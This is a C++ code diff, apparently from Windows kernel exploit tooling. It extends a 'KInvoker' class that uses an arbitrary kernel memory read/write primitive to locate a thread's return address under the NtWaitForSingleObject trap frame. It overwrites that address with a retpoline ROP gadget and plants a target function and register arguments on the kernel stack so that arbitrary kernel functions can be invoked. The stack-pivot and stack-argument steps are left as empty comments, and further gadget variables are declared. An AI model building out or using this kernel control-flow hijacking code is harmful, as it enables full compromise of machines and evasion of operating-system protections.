@@ -23,6 +23,8 @@ NTSTATUS NtWaitForSingleObject(
 	DWORD Timeout
 );
 
+constexpr ULONG c_TrapFrameSize = 0x190;
+
 class KInvoker 
 {
 
@@ -42,7 +44,6 @@ class KInvoker
 		constexpr ULONG c_InitialStackOffset = 0x28;
 		kAddress initialStack = g_Rw->ReadQword(CallingThread + c_InitialStackOffset);
 
-		constexpr ULONG c_TrapFrameSize = 0x190;
 		kAddress returnAddress = g_Rw->ReadQword(initialStack - c_TrapFrameSize - sizeof(kAddress));
 		return returnAddress;
 	}
@@ -54,8 +55,49 @@ class KInvoker
 		_Inout_ Qword* ReturnValue,
 		_In_ std::tuple<Args...>&& Args
 	) {
-		kAddress returnAddress = GetNtWaitForSingleObjectReturnAddress(CallingThread);
-		g_Rw->WriteQword()
+
+		kAddress rsp = GetNtWaitForSingleObjectReturnAddress(CallingThread);
+
+		//
+		// Read previous trap frame
+		//
+		std::vector<Byte> trapFrame = g_Rw->ReadBuffer(rsp + 8, c_TrapFrameSize);
+
+		// Pivot to our own stack!
+		
+
+		//
+		// We'll use the retpoline gadget. Recall it looks as follows:
+		//
+		// __guard_retpoline_exit_indirect_rax:
+		//  ...
+		//	mov rax, [rsp+0x20]
+		//	mov rcx, [rsp+0x28]
+		//	mov rdx, [rsp+0x30]
+		//	mov r8,  [rsp+0x38]
+		//	mov r9,  [rsp+0x40]
+		//	add rsp, 0x28
+		//  jmp rax
+		//
+
+		g_Rw->WriteQword(rsp, s_RetpolineGadget);
+
+		// add jump target: Function
+		rsp += 8;
+		g_Rw->WriteQword(rsp + 0x20, Function);
+
+		// add register arguments
+		if constexpr (std::size(Args) >= 1) 
+			g_Rw->WriteQword(rsp + 0x28, Qword(std::get<0>(Args)));
+		if constexpr (std::size(Args) >= 2)
+			g_Rw->WriteQword(rsp + 0x30, Qword(std::get<1>(Args)));
+		if constexpr (std::size(Args) >= 3)
+			g_Rw->WriteQword(rsp + 0x38, Qword(std::get<2>(Args)));
+		if constexpr (std::size(Args) >= 4)
+			g_Rw->WriteQword(rsp + 0x40, Qword(std::get<3>(Args)));
+
+		// add remaining stack arguments
+
 	}
 
 	/*
@@ -87,6 +129,9 @@ public:
 private:
 	std::queue<std::function<void()>> m_TaskQueue;
 
+	static kAddress s_RetpolineGadget;
+	static kAddress s_PivotGadget;
+	static kAddress s_PopRbpGadget;
 };
 
 
